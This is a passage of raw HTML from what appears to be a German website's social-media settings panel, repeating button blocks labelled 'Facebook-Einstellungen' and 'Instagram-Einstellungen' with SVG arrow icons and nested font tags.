                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Facebook-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instagram-Einstellungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
